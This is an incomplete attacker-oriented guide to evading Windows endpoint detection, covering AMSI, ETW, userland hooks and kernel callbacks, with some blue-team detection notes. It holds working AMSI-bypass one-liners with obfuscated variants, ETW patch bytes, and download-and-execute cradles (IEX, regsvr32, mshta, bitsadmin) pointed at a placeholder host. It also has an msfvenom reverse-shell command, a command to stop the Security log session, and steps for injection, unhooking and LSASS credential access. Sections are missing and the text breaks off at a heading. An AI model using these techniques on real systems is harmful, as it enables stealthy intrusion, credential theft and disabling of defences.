1. FOUNDATIONS: RUNTIME DETECTION ARCHITECTURE
================================================================================

Runtime detection = security software that watches BEHAVIOR while code
executes (as opposed to static scanning of files on disk).

Unlike log evasion (clearing event logs after the fact), runtime evasion
must happen WHILE your code is running, before detection fires.

--------------------------------------------------------------------------------
1.1 RUNTIME DETECTION COMPONENTS
--------------------------------------------------------------------------------

  1. USERLAND HOOKS
     EDR injects hooks (JMP instructions) into:
       - ntdll.dll (Nt* syscalls)
       - kernel32.dll / kernelbase.dll
       - win32u.dll (GUI syscalls)
     When your code calls these, EDR's userland agent sees the call
     first (via detour), analyzes it, then forwards to real function.

  2. KERNEL CALLBACKS (bypass userland hooks)
     - PsSetCreateProcessNotifyRoutineEx  (process create/terminate)
     - PsSetCreateThreadNotifyRoutine     (thread create)
     - PsSetLoadImageNotifyRoutine        (DLL/driver load)
     - ObRegisterCallbacks                (handle open - protects lsass)
     - CmRegisterCallbackEx               (registry operations)
     - Minifilter drivers                  (file I/O, IRP_MJ_*)
     - WFP (Windows Filtering Platform)    (network)
     Kernel callbacks fire regardless of userland hook state.

  3. AMSI (Anti-Malware Scan Interface)
     Scans script content (PowerShell, JScript, VBScript, Office macros,
     COM objects) BEFORE execution. Content-based detection.

  4. ETW (Event Tracing for Windows)
     Microsoft's logging framework. EDRs subscribe to ETW providers:
       - Microsoft-Windows-Threat-Intelligence (TI)
       - Microsoft-Windows-Windows Defender
       - Microsoft-Antimalware-Scan-Interface
     ETW kernel sessions can capture process, thread, image, registry,
     network events with minimal overhead.

  5. CLR / .NET INSTRUMENTATION
     For .NET payloads: Profiling API (ICorProfiler), assembly load
     callbacks, IL rewriting, method hooking.

  6. CLOUD ML / BEHAVIOR ANALYTICS
     Sequence-based detection: chain of innocent events = malicious
     behavior. Sent to cloud, analyzed with ML models.

--------------------------------------------------------------------------------
1.2 WHERE DETECTION FIRES (kill chain view)
--------------------------------------------------------------------------------

  1. File drop         -> Static AV scan, FIM, Sysmon 11
  2. Process start     -> AV scan, command-line logging (Sysmon 1)
  3. Script load       -> AMSI scan, PS Script Block Logging
  4. API call (alloc)  -> ETW TI, EDR hook on VirtualAlloc
  5. API call (write)  -> ETW TI, EDR hook on WriteProcessMemory
  6. Remote thread     -> Kernel callback (CreateRemoteThread), Sysmon 8
  7. Network connect   -> EDR hook, Sysmon 3, WFP
  8. Credential access -> ObRegisterCallbacks (lsass), Sysmon 10
  9. Privilege change  -> Token monitoring, Sysmon 4672/4688
  10. Persistence      -> Registry monitoring, Sysmon 13, autoruns

YOUR GOAL: Make each of these 10 steps appear benign to the sensor,
OR never trigger the sensor at all.

--------------------------------------------------------------------------------
1.3 EVASION STRATEGY LAYERS
--------------------------------------------------------------------------------

  Layer 1: STATIC Evasion (file on disk)
    - Obfuscation, packing, encryption
    - Avoid AV signatures on the raw file
    - AMSI-safe strings, EDR YARA rules

  Layer 2: DYNAMIC Evasion (behavior at runtime)
    - AMSI bypass (scanning of script content)
    - ETW patching (telemetry pipeline)
    - Unhooking (userland hook removal)
    - Syscall indirection (bypass userland hooks)

  Layer 3: EXECUTION Evasion (technique choice)
    - Process injection variants
    - LOLBins / signed binary execution
    - Module stomping / reflective loading
    - Fileless / registry-based payloads

  Layer 4: OPSEC Evasion (post-compromise)
    - Low-and-slow timing
    - Blend with admin activity
    - Clean artifacts
    - Encrypted C2

2. THE DETECTION PIPELINE: WHAT CATCHES YOU AT RUNTIME
================================================================================

--------------------------------------------------------------------------------
2.1 STATIC AV DETECTION
--------------------------------------------------------------------------------

How it works:
  - Signature matching (byte patterns, strings, YARA)
  - Heuristics (entropy, API import patterns, PE structure)
  - ML models on file features
  - Cloud reputation (hash lookup)
  - Packer / crypter detection
  - Unpacks and rescans in sandbox

What it catches:
  - Known malware hashes / signatures
  - Suspicious PE headers (odd section names, RWX, missing imports)
  - High-entropy (packed/encrypted) sections
  - Known malicious strings ("mimikatz", "Invoke-Mimikatz")
  - AMSI-triggering strings (see section 4)

Evasion:
  - Encrypt/pack payload, decrypt in memory
  - Change hashes (trivial)
  - Avoid suspicious imports (dynamic API resolution)
  - Fileless (never write to disk)

--------------------------------------------------------------------------------
2.2 EDR DYNAMIC DETECTION
--------------------------------------------------------------------------------

How it works:
  - Userland hooks (see 1.1)
  - Kernel callbacks + minifilters
  - Behavioral rules (chains)
  - Memory scanning (YARA on process memory)
  - Network inspection (TLS breakpoints, JA3)
  - Cloud ML on behavior sequences

What it catches:
  - VirtualAlloc(RWX) + WriteProcessMemory + CreateRemoteThread chain
  - LSASS handle access (OpenProcess on lsass)
  - AMSI bypass attempts (signature + behavior)
  - ETW patching (memory write to ntdll)
  - Unhooking (VirtualProtect on ntdll)
  - Reflective DLL loading
  - Syscall anomalies

Evasion:
  - Use less-signatured injection variants
  - Direct/indirect syscalls (bypass userland hooks)
  - Module stomping (load legit DLL, overwrite)
  - Sleep obfuscation (encrypted sleep)
  - PPID spoofing (parent process mismatch)

--------------------------------------------------------------------------------
2.3 AMSI DETECTION
--------------------------------------------------------------------------------

How it works:
  - Content handed to provider (Defender, 3rd party AV)
  - Provider scans for known malicious script patterns
  - Returns AMSI_RESULT_DETECTED -> script blocked

What it catches:
  - Known AMSI bypass signatures
  - Mimikatz, PowerUp, Seatbelt, etc. (signature matches)
  - Obfuscated-but-known patterns
  - Base64-encoded known payloads

Evasion:
  - AMSI bypass (see section 4)
  - String obfuscation (breaks signatures)
  - Custom tooling (not signatured)
  - Avoid PowerShell entirely (use C# / native)

--------------------------------------------------------------------------------
2.4 ETW DETECTION
--------------------------------------------------------------------------------

How it works:
  - ETW providers emit events to SIEM / EDR backend
  - Kernel ETW session captures process/thread/registry/network
  - Threat-Intelligence (TI) provider monitors suspicious API calls

What it catches:
  - Suspicious process creation (cmd -> powershell, powershell -> lsass)
  - Cross-process memory operations
  - LSASS access
  - Suspicious registry writes (Run keys, services)
  - Network connections to C2

Evasion:
  - Patch EtwEventWrite / EtwEventWriteTransfer (see section 5)
  - Reduce telemetry by disabling providers (needs admin)
  - Use API paths that don't generate ETW events (rare)

4. AMSI (ANTI-MALWARE SCAN INTERFACE) - DEEP DIVE & BYPASS
================================================================================

--------------------------------------------------------------------------------
4.1 HOW AMSI WORKS
--------------------------------------------------------------------------------

Flow when PowerShell executes a script:
  1. PS reads script text
  2. Calls AmsiInitialize("PowerShell")
  3. Calls AmsiOpenSession() -> session handle
  4. Calls AmsiScanBuffer(session, buffer, length, contentname, appname)
  5. AmsiScanBuffer hands buffer to AV provider (Defender, etc.)
  6. Provider returns result:
       AMSI_RESULT_CLEAN (0)
       AMSI_RESULT_NOT_DETECTED (1)
       AMSI_RESULT_BLOCKED_BY_ADMIN_START (0x4000)
       AMSI_RESULT_BLOCKED_BY_ADMIN_END (0x4fff)
       AMSI_RESULT_DETECTED (32768)
  7. If DETECTED -> PowerShell aborts execution, writes event

AMSI scans:
  - PowerShell script blocks (before execution, not after)
  - JScript / VBScript (cscript/wscript)
  - Office macros (VBA)
  - COM objects (via IInitializeWithStream)
  - Windows Script Host

AMSI providers registered:
  C:\Program Files\Windows Defender\MpOav.dll (Defender)
  Various 3rd party AV (CrowdStrike, Sophos, etc.)

--------------------------------------------------------------------------------
4.2 AMSI BYPASS TECHNIQUES
--------------------------------------------------------------------------------

TECHNIQUE 1: SET amsiInitFailed (Classic Reflection Bypass)

Concept: AMSI initializes lazily. Before first scan, set internal
boolean amsiInitFailed = true, so AmsiScanBuffer returns error and
PowerShell skips scanning.

PowerShell one-liner (classic - widely known):
  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').
    GetField('amsiInitFailed','NonPublic,Static').
    SetValue($null,$true)

Obfuscated variants:
  # String splitting
  $a='System.Management.Automation.Am';$b='siUtils'
  [Ref].Assembly.GetType($a+$b).GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

  # Reflection to avoid direct string
  $t=[Ref].Assembly.GetTypes()|?{$_.Name -like '*Amsi*'}
  $f=$t.GetFields('NonPublic,Static')|?{$_.Name -like '*failed*'}
  $f.SetValue($null,$true)

  # Using GetMethod/GetField with string construction
  $n='amsi'+'Init'+'Failed'
  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField($n,'NonPublic,Static').SetValue($null,$true)

TECHNIQUE 2: PATCH AmsiScanBuffer IN MEMORY

Concept: Overwrite the AmsiScanBuffer function (in amsi.dll) with:
  mov eax, 0x80070057  ; E_INVALIDARG
  ret

This makes every scan return error -> treated as "not detected".

PowerShell (educational - real EDRs detect this):
  # Get AmsiScanBuffer address
  $addr = (Get-Process -Id $PID).Modules |
    ?{$_.ModuleName -eq 'amsi.dll'} |
    Select -Exp BaseAddress
  # Add offset of AmsiScanBuffer (varies by Windows version)
  # Write bytes: B8 57 00 07 80 C3
  # Requires VirtualProtect to RWX, then write, then restore

Tools that do this automatically:
  - Cobalt Strike (malleable C2 amsi bypass)
  - Various GitHub repos (AmsiBypass, SharpAMSI)
  - Rubeus (contains bypass for Kerberos operations)
  - Covenant / Mythic / Sliver C2 frameworks

TECHNIQUE 3: AMSI BYPASS VIA DUPLICATE / FORGED HANDLES

  - Open handle to current process, get token
  - Modify in-memory AMSI state via WriteProcessMemory to self
  - (Variation of technique 2)

TECHNIQUE 4: AMSI CONTENT EVASION (avoid signature match)

  - Change variable names, add whitespace, reorder statements
  - Base64 encode strings, decode at runtime
  - Split known malicious strings across concatenation
  - Use alternative APIs / cmdlets for same behavior
  - Invoke-Obfuscation automates this

TECHNIQUE 5: AVOID AMSI ENTIRELY

  - Execute from C# / native code (no AMSI)
  - Use cmd.exe / wscript (limited AMSI coverage)
  - Use mshta / regsvr32 / other LOLBins
  - Direct syscall shellcode (no PS involvement)

--------------------------------------------------------------------------------
4.3 AMSI BYPASS DETECTION (BLUE TEAM)
--------------------------------------------------------------------------------

  - Signature: known bypass patterns (amsiInitFailed, specific byte patches)
  - Behavioral: VirtualProtect on amsi.dll memory
  - ETW TI: reports AMSI bypass attempts in real-time
  - Memory: scan for patched AmsiScanBuffer bytes
  - Hook: AmsiScanBuffer hook detects caller tampering
  - CLR: AMSI bypass is visible via .NET instrumentation
  - Heuristic: GetField on NonPublic/Static fields of AmsiUtils class

Modern EDRs: multiple layers make classic bypasses fail often.
Custom, obfuscated, novel bypasses work better (but still risky).

--------------------------------------------------------------------------------
4.4 TOOLS FOR AMSI TESTING
--------------------------------------------------------------------------------

  AMSITrigger (find AMSI-triggering strings):
    https://github.com/Rmafo9/AMSITrigger
    AMSITrigger.exe -f malicious.ps1
    # Identifies which substrings cause AMSI detection

  Invoke-Obfuscation:
    https://github.com/danielbohannon/Invoke-Obfuscation
    Import-Module Invoke-Obfuscation
    Set-ObfuscationSection PATH C:\payload.ps1
    TOKEN\ALL\1
    OUT C:\obfuscated.ps1

  PowerSploit AMSI bypass (educational archive):
    Out-EncryptedScript (encrypt scripts, decrypt in memory)

5. ETW (EVENT TRACING FOR WINDOWS) - DEEP DIVE & EVASION
================================================================================

--------------------------------------------------------------------------------
5.1 HOW ETW WORKS
--------------------------------------------------------------------------------

Components:
  1. Providers (emit events): kernel, user apps, EDR agents
  2. Controllers (start/stop sessions): logman, wevtutil, EDR agents
  3. Consumers (receive events): SIEM, EDR backend, Event Viewer

Key ETW providers for evasion:
  - Microsoft-Windows-Threat-Intelligence (TI)
    Reports: process injection, LSASS access, AMSI bypass, ETW patching
  - Microsoft-Windows-Windows Defender
    AV/AMSI activity
  - Microsoft-Antimalware-Scan-Interface
    AMSI scan results
  - Microsoft-Windows-Kernel-Process
    Process/thread/image events
  - Microsoft-Windows-DNS-Client
    DNS queries

ETW API functions to be aware of:
  EtwEventRegister        (register provider)
  EtwEventWrite          (write event - MAIN PATCH TARGET)
  EtwEventWriteTransfer  (write with activity ID)
  EtwEventWriteEx        (extended write)
  EtwEventWriteFull      (full write)
  EtwEventWriteString    (string write)
  EtwEventWriteNoRegistration (no registration write)

ETW is used heavily by:
  - Windows Defender
  - Sysmon (partially)
  - CrowdStrike / SentinelOne / MDE (userland + kernel ETW)
  - PowerShell Script Block Logging (ETW-based)

--------------------------------------------------------------------------------
5.2 ETW PATCHING TECHNIQUES
--------------------------------------------------------------------------------

TECHNIQUE 1: PATCH EtwEventWrite IN MEMORY

Concept: Overwrite EtwEventWrite (in ntdll.dll) with:
  xor eax, eax  ; return 0
  ret

Result: All userland ETW writes silently fail. Kernel ETW still works.

PowerShell (educational):
  # Get address of EtwEventWrite in ntdll
  # Use VirtualProtect to make RWX
  # Write: 33 C0 C3 (xor eax,eax; ret) or just C3 (ret)
  # Restore protection

Real implementations:
  - ETWp / EtwEventWrite patchers (GitHub)
  - Cobalt Strike + various C2 frameworks
  - SharpETW, ETWPatcher tools

TECHNIQUE 2: PATCH EtwEventWriteTransfer

Some EDRs use EtwEventWriteTransfer instead. Patch both:
  xor eax, eax
  ret

TECHNIQUE 3: UNREGISTER ETW PROVIDER

  # From admin context, stop ETW session:
  logman query -ets
  logman stop "EventLog-Security" -ets
  logman delete "SomeProvider" -ets

TECHNIQUE 4: KERNEL ETW PATCHING (advanced, dangerous)

  - Requires kernel driver or exploit
  - Patch EtwpGetCycleCount / internal ETW functions
  - PatchGuard (PG) detects kernel ETW tampering -> BSOD
  - Out of scope for most labs

TECHNIQUE 5: REDUCE ETW NOISE (OPSEC)

  - Disable unnecessary ETW providers (if admin)
  - Use API calls that don't generate ETW TI events
  - Sleep between suspicious calls (avoid behavior chains)
  - Use alternate execution paths

--------------------------------------------------------------------------------
5.3 ETW EVASION DETECTION
--------------------------------------------------------------------------------

  - Memory: EDR checks EtwEventWrite bytes periodically
  - Hook: EtwEventWrite hook detects patching
  - ETW TI: detects ETW patching itself (meta-detection)
  - Behavioral: sudden drop in event volume from a process
  - Kernel: ETW kernel session still fires even if userland patched
  - Code integrity: HVCI / CI.dll validates ntdll integrity

Modern EDRs: kernel ETW + userland hooks + cloud = patching userland
ETW alone is often insufficient.

--------------------------------------------------------------------------------
5.4 ETW COMMANDS FOR LABS
--------------------------------------------------------------------------------

  # List ETW sessions
  logman query -ets
  logman query providers

  # Stop/start sessions
  logman stop "Name" -ets
  logman start "Name" -ets

  # Enable provider via logman
  logman create trace MyTrace -p "Microsoft-Windows-Threat-Intelligence" 0xffffffff 0xff -o C:\trace.etl

  # Convert ETL to readable
  tracerpt C:\trace.etl -o C:\trace.csv -of CSV

  # PowerShell ETW utilities
  Get-EtwTraceSession
  Stop-EtwTraceSession -Name "Name"

8. PROCESS INJECTION (T1055) - FULL TAXONOMY
================================================================================

--------------------------------------------------------------------------------
8.1 WHY INJECT?
--------------------------------------------------------------------------------

  - Hide malicious code inside legitimate process memory
  - Bypass application whitelisting (code runs inside allowed process)
  - Escape from suspicious parent process (cmd.exe, powershell.exe)
  - Steal tokens / privileges of target process
  - Bypass file-based detection (no new .exe on disk)
  - Access protected process memory (if privileges allow)

--------------------------------------------------------------------------------
8.2 CLASSIC DLL INJECTION (T1055.001) - MOST DETECTED
--------------------------------------------------------------------------------

Steps (detected by EDR):
  1. OpenProcess(PROCESS_ALL_ACCESS) on target
  2. VirtualAllocEx(target, size, MEM_COMMIT, PAGE_READWRITE)
  3. WriteProcessMemory(target, buffer, DLL path)
  4. CreateRemoteThread(target, LoadLibraryA, path)
  5. WaitForSingleObject

Detection:
  - Sysmon 8 (CreateRemoteThread)
  - Sysmon 10 (ProcessAccess - OpenProcess on target)
  - EDR hook on WriteProcessMemory / CreateRemoteThread
  - Kernel callback: ObRegisterCallbacks (handle filtering)
  - Behavioral: unsigned DLL loaded into signed process

Evasion:
  - Use alternate injection method (see below)
  - Module stomping (load legit DLL, overwrite)
  - Direct syscalls (bypass userland hooks on these APIs)
  - Inject into less-monitored process (not lsass, not csrss)

--------------------------------------------------------------------------------
8.3 PROCESS HOLLOWING (T1055.012)
--------------------------------------------------------------------------------

Steps:
  1. CreateProcess(suspended) - e.g., svchost.exe, explorer.exe
  2. NtUnmapViewOfSection(target, imageBase) - remove legit code
  3. VirtualAllocEx(target, imageBase, size, MEM_COMMIT, RWX)
  4. WriteProcessMemory(target, imageBase, maliciousPE, size)
  5. SetThreadContext(target, entryPoint) - redirect execution
  6. ResumeThread(target)

Variants:
  - Process Doppelgänging (NTFS transaction based)
  - Process Herpaderping (file modification after mapping)
  - Process Ghosting (delete file before execution)
  - Transacted Hollowing

Detection:
  - Sysmon 1 (process create) + Sysmon 8 (thread)
  - EDR: unmap + write + resume sequence
  - Memory: image on disk != memory (PE mismatch)
  - Kernel: NtUnmapViewOfSection call logging

Evasion:
  - Use alternate variants (Ghosting, Herpaderping)
  - Direct syscalls for unmap/write/resume
  - Sleep between steps (break behavior chain)
  - Hollow less-monitored process

--------------------------------------------------------------------------------
8.4 ASYNCHRONOUS PROCEDURE CALL (T1055.004)
--------------------------------------------------------------------------------

Concept: Queue user APC (Asynchronous Procedure Call) to target thread,
which executes when thread enters alertable wait state.

Steps:
  1. OpenProcess + VirtualAllocEx + WriteProcessMemory (classic)
  2. QueueUserAPC(targetThread, shellcode) instead of CreateRemoteThread
  3. Trigger alertable state (e.g., NtTestAlert, or wait for natural state)

Advantages:
  - Less signature than CreateRemoteThread
  - Runs in existing thread context

Detection:
  - Sysmon 8 (if thread create detected)
  - EDR: QueueUserAPC hook, cross-process APC

--------------------------------------------------------------------------------
8.5 THREAD HIJACKING (T1055.003)
--------------------------------------------------------------------------------

Concept: Take over existing thread in target process, change its
instruction pointer (RIP/EIP) to point to injected shellcode.

Steps:
  1. OpenProcess + OpenThread on target
  2. VirtualAllocEx + WriteProcessMemory (allocate + write shellcode)
  3. SuspendThread(targetThread)
  4. GetThreadContext(targetThread, context)
  5. Save original RIP, set RIP = shellcode address
  6. SetThreadContext + ResumeThread

Variants:
  - Early Bird (inject before process starts, before entry point)
  - Fiber-based (convert to fiber, switch context)
  - Callback-based (SetWindowsHookEx, TimerAPC)

Detection:
  - Sysmon 8, Sysmon 10
  - EDR: Get/SetThreadContext hook, SuspendThread
  - Behavioral: thread RIP changed to non-image memory

--------------------------------------------------------------------------------
8.6 MODULE STOMPING (less detected)
--------------------------------------------------------------------------------

Concept: Load legitimate DLL into target, then overwrite its memory
with shellcode. The DLL exists in module list, appears legitimate.

Steps:
  1. OpenProcess + VirtualAllocEx
  2. WriteProcessMemory: write DLL path
  3. CreateRemoteThread: call LoadLibraryA(dllPath)
  4. Wait for DLL to load, find its base address
  5. VirtualProtect: change DLL .text to RWX
  6. WriteProcessMemory: overwrite DLL .text with shellcode
  7. CreateRemoteThread: call shellcode at DLL address

Advantages:
  - DLL appears in module list (Sysmon 7)
  - Signed DLL path visible
  - No new DLL file on disk

Detection:
  - Sysmon 7 (module load) - but DLL is legit
  - Memory: DLL .text != on-disk DLL .text
  - EDR: WriteProcessMemory into loaded DLL

Evasion:
  - Use lesser-known signed DLLs
  - Partial overwrite (small shellcode stub)
  - Direct syscalls for writes

--------------------------------------------------------------------------------
8.7 MODULE HOLLOWING / PHANTOM DLL HOLLOWING
--------------------------------------------------------------------------------

Similar to process hollowing but at DLL level:
  1. Map DLL into memory (not loaded via LoadLibrary)
  2. Unmap or overwrite its contents
  3. Redirect execution to overwritten DLL

Variants:
  - Phantom DLL hollowing
  - Module stomping variant
  - IAT patching (replace import table entries)

--------------------------------------------------------------------------------
8.8 LSASS INJECTION / CREDENTIAL ACCESS
--------------------------------------------------------------------------------

Target: lsass.exe (Local Security Authority) - holds credentials in memory.

Injection into lsass (for credential dumping):
  1. OpenProcess(PROCESS_VM_READ|PROCESS_VM_WRITE, lsass)
  2. (ObRegisterCallbacks may block this)
  3. Inject payload that reads lsass memory
  4. Extract credential material (hashes, tickets)

Alternative: inject into own process, open lsass via handle duplication

Detection:
  - Sysmon 10 (ProcessAccess on lsass)
  - EDR: ObRegisterCallbacks blocks lsass access
  - ETW TI: LSASS access events
  - Behavioral: non-lsass process reading lsass memory

Evasion:
  - PPL (Protected Process Light) bypass (advanced)
  - Direct kernel object manipulation
  - Use legitimate tools (ProcDump) - noisy
  - Token stealing instead of credential dumping

--------------------------------------------------------------------------------
8.9 PROCESS INJECTION TOOLS
--------------------------------------------------------------------------------

  Metasploit:
    msfvenom -p windows/x64/meterpreter/reverse_tcp ...
    Use meterpreter migrate <pid>  (process migration)

  Cobalt Strike:
    inject <pid> <bof/assembly>
    shspawn <pid>  (spawn into specific process)

    Various injection commands

  PPID Spoofing tools:

9. IN-MEMORY / FILELESS EXECUTION
================================================================================

--------------------------------------------------------------------------------
9.1 WHY FILELESS?
--------------------------------------------------------------------------------

  - No file on disk -> no static AV scan
  - No MFT entry, no prefetch, no AmCache
  - No file hash for threat intel
  - Memory-only artifacts (cleared on process exit)
  - Harder for forensics (memory dump required)

--------------------------------------------------------------------------------
9.2 TECHNIQUES
--------------------------------------------------------------------------------

TECHNIQUE 1: POWERSHELL IN-MEMORY

  # Download + execute in memory (no file write):
  IEX (New-Object Net.WebClient).DownloadString('http://x/p.ps1')

  # Load .NET assembly from bytes:
  $bytes = (New-Object Net.WebClient).DownloadData('http://x/payload.exe')
  [Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null,$null)

TECHNIQUE 2: REGISTRY STORAGE

  # Store encrypted payload in registry:
  reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /v Update /t REG_BINARY /d <encrypted_shellcode>

  # Or store as string, decode at runtime:
  $data = (Get-ItemProperty HKCU:\Software\Update).Payload
  $dec = AESDecrypt([Convert]::FromBase64String($data), $key)
  # Execute $dec in memory

TECHNIQUE 3: WMI PERSISTENCE (no file)

  Permanent WMI event subscription:
    __EventFilter (trigger, e.g., process creation)
    __EventConsumer (action, e.g., run PowerShell)
    __FilterToConsumerBinding (link)
  Stored in WMI repository, no standalone file

TECHNIQUE 4: COM / SCROBJ SCRIPTLETS

  # Remote SCT execution:
  regsvr32 /s /n /u /i:http://x/payload.sct scrobj.dll
  # Scriptlet downloaded, executed in memory via COM

TECHNIQUE 5: REFLECTIVE DLL LOADING

  DLL with reflective loader (no LoadLibrary):
    - DLL contains its own loader
    - Shellcode (from Donut/sRDI) maps DLL into memory
    - Calls DllMain directly
    - Module never in PEB module list
    - No Sysmon 7 event

TECHNIQUE 6: SHELLCODE INJECTION (native)

  # Allocate RWX memory in own process:
  VirtualAlloc(NULL, size, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
  # Copy shellcode into it
  # CreateThread(shellcode)
  # Or use fiber / APC execution

TECHNIQUE 7: MSHTA / REGSVR32 REMOTE

  mshta http://x/payload.hta
  regsvr32 /s /n /u /i:http://x/x.sct scrobj.dll
  # Payload fetched and executed in memory

TECHNIQUE 8: BITS JOBS (background intelligence transfer)

  bitsadmin /create job
  bitsadmin /addfile job http://x/payload.exe %TEMP%\p.exe
  bitsadmin /resume job
  # Executes in background, low priority

--------------------------------------------------------------------------------
9.3 FILELESS DETECTION
--------------------------------------------------------------------------------

  - AMSI (scans script content regardless of file)
  - ETW (process, network, registry events)
  - Memory scanning (YARA on process memory)
  - Network (download cradle = network connection)
  - Registry monitoring (Run keys, WMI)
  - Behavioral: PS + download + execute chain
  - Cloud ML: behavior sequence analysis

--------------------------------------------------------------------------------
9.4 SLEEP OBFUSCATION (EVADE MEMORY SCANNING)
--------------------------------------------------------------------------------

Problem: During sleep, shellcode sits in RWX memory, scanned by EDR.

Solution: Encrypt memory during sleep, decrypt to execute.

Techniques:
  - Ekko (timer-based encryption)
  - Foliage (VM-based sleep obfuscation)
  - DarkGate / various C2 frameworks implement this
  - Custom: XOR/AES encrypt shellcode buffer before sleep,
    decrypt after sleep, execute next stage

Concept (pseudo):
  while True:
    decrypt(shellcode)
    execute_stage()
    encrypt(shellcode)  # hide during sleep
    sleep(jitter)

10. UNHOOKING & DIRECT SYSCALLS
================================================================================

--------------------------------------------------------------------------------
10.1 UNHOOKING NT.DLL
--------------------------------------------------------------------------------

Concept: EDR installs userland hooks (JMP instructions) at the start
of Nt* functions in ntdll.dll. Unhooking restores clean ntdll.

Steps:
  1. Open KnownDlls section object: \\KnownDlls\\ntdll.dll
     (contains clean ntdll copy loaded at boot)
  2. MapViewOfFile -> clean ntdll in memory
  3. Get current ntdll base: GetModuleHandle("ntdll.dll")
  4. VirtualProtect current ntdll .text to RWX
  5. Copy clean bytes over hooked bytes
  6. Restore protection to RX

Tools implementing this:
  - Sysinternals: no (defensive tool)
  - Syswhispers / Hell's Gate libraries
  - Cobalt Strike BOF (unhookNTDLL)
  - SharpUnhook, inlineHook (GitHub)
  - Various C2 frameworks

Detection:
  - EDR detects VirtualProtect on ntdll memory
  - Memory integrity check: ntdll on disk != ntdll in memory
  - Behavioral: sudden "clean" API calls after unhook
  - Kernel callbacks still fire (unhooking only removes userland hooks)

Limitations:
  - Kernel callbacks unaffected
  - ETW kernel session unaffected
  - Memory integrity / HVCI detects modification
  - Some EDRs re-hook periodically

--------------------------------------------------------------------------------
10.2 DIRECT SYSCALLS
--------------------------------------------------------------------------------

Concept: Bypass userland hooks entirely by invoking syscalls directly,
skipping hooked ntdll functions.

Windows syscall convention (x64):
  mov r10, rcx        ; NT calling convention
  mov eax, <SSN>      ; System Service Number
  syscall
  ret

SSN = System Service Number (varies by Windows version)

Example:
  NtAllocateVirtualMemory = SSN 0x18 (example, varies)
  NtWriteVirtualMemory    = SSN 0x3A
  NtProtectVirtualMemory  = SSN 0x50
  NtCreateThreadEx        = SSN 0xC2

Syswhispers3 generates assembly stubs:
  Sw3NtAllocateVirtualMemory PROC
    mov r10, rcx
    mov eax, 0x18          ; SSN
    syscall
    ret
  Sw3NtAllocateVirtualMemory ENP

Hell's Gate:
  - Dynamically resolves SSN at runtime from clean ntdll
  - Or from syscall gadget search if ntdll hooked

Halo's Gate:
  - If SSN lookup fails (hooked), search neighboring functions
  - Find unhooked neighbor, derive SSN by offset

Tartarus Gate:
  - Syscall gadget search (search for syscall; ret pattern)
  - More resilient to hooking

--------------------------------------------------------------------------------
10.3 INDIRECT SYSCALLS
--------------------------------------------------------------------------------

Concept: Get SSN from (possibly hooked) ntdll, but invoke syscall via
unhooked syscall gadget elsewhere in ntdll.

Steps:
  1. Parse ntdll to find SSN (even if hooked, SSN is in function body)
  2. Find a clean "syscall; ret" gadget in ntdll
  3. Jump to gadget with SSN in eax

Advantages:
  - Doesn't call hooked Nt* function
  - Doesn't need unhooking
  - Call stack looks more legitimate (return to ntdll)

Tools:
  - Syswhispers3 (indirect mode)
  - Halo's Gate / Tartarus Gate variants

--------------------------------------------------------------------------------
10.4 SYSCALL EVASION DETECTION
--------------------------------------------------------------------------------

  - EDR kernel driver monitors syscall patterns
  - Unusual syscall numbers or sequences
  - Syscall from non-ntdll memory region
  - Syscall with unexpected stack / return address
  - Behavioral: unusual API call order
  - Kernel minifilter still catches file/registry ops
  - ETW kernel session still active

Modern EDRs:
  - Some use kernel-mode hooks that syscall can't bypass
  - Hypervisor-based detection (some EDRs)
  - Memory integrity (CI.dll, HVCI)

================================================================================
13. BYOVD (BRING YOUR OWN VULNERABLE DRIVER)
================================================================================

--------------------------------------------------------------------------------
13.1 CONCEPT
--------------------------------------------------------------------------------

Attackers use legitimately-signed but VULNERABLE drivers to disable
security software from kernel mode.

Why it works:
  - Signed drivers are trusted by Windows
  - ELAM allows signed drivers to load early
  - Vulnerable driver gives kernel code execution
  - Can disable EDR kernel callbacks / minifilters

Examples of abused vulnerable drivers (historical):
  - dbutil_2_3.sys (Dell) - CVE-2021-21551
  - RTCore64.sys (MSI Afterburner) - arbitrary kernel R/W
  - gdrv.sys (Gigabyte) - CVE-2018-19320
  - WinRing0.sys (various) - arbitrary MSR access
  - Many others (see "Vulnerable Drivers" list by Microsoft)

--------------------------------------------------------------------------------
13.2 ATTACK FLOW
--------------------------------------------------------------------------------

  1. Load vulnerable signed driver (via service creation)
  2. Use driver's IOCTL interface for kernel R/W
  3. Patch EDR kernel structures:
     - Unlink EDR callbacks from PsSetCreateProcessNotifyRoutine
     - Disable minifilter via FltUnregisterFilter
     - Patch EDR kernel driver code
  4. EDR is "blind" in kernel
  5. Now userland injection/evasion succeeds more easily

--------------------------------------------------------------------------------
13.3 DEFENSE
--------------------------------------------------------------------------------

  - Microsoft Vulnerable Driver Blocklist (Smart App Control)
  - HVCI / Memory Integrity (blocks vulnerable driver loading)
  - Secure Boot
  - Driver signature enforcement
  - EDR drivers now protected by ELAM + PatchGuard

NOTE: BYOVD is advanced, risky (can BSOD), and largely mitigated on
modern systems with HVCI + Secure Boot. Out of scope for most labs.

================================================================================
15. EDR DETECTION TECHNIQUES (BLUE TEAM VIEW)
================================================================================

--------------------------------------------------------------------------------
15.1 USERLAND HOOKING
--------------------------------------------------------------------------------

How it works:
  - EDR DLL injects JMP at start of Nt* functions
  - When code calls NtAllocateVirtualMemory, EDR sees it first
  - EDR analyzes, then forwards to real function

APIs hooked (typical):
  NtAllocateVirtualMemory, NtProtectVirtualMemory
  NtWriteVirtualMemory, NtReadVirtualMemory
  NtCreateThreadEx, NtOpenProcess
  NtWriteFile, NtCreateFile
  LdrLoadDll, LdrGetProcedureAddress

Bypass: Direct syscalls (section 10)

--------------------------------------------------------------------------------
15.2 KERNEL CALLBACKS
--------------------------------------------------------------------------------

  - PsSetCreateProcessNotifyRoutineEx: process create/terminate
  - PsSetCreateThreadNotifyRoutine: thread create
  - PsSetLoadImageNotifyRoutine: DLL/driver load
  - ObRegisterCallbacks: handle open (protects lsass)
  - CmRegisterCallbackEx: registry operations
  - Minifilter (IRP_MJ_*): file I/O
  - WFP: network

Bypass: Cannot bypass from userland. Must use:
  - Less-signatured techniques (still fire callbacks, but less suspicious)
  - Kernel exploits to unlink callbacks
  - BYOVD (section 13)

--------------------------------------------------------------------------------
15.3 MEMORY SCANNING
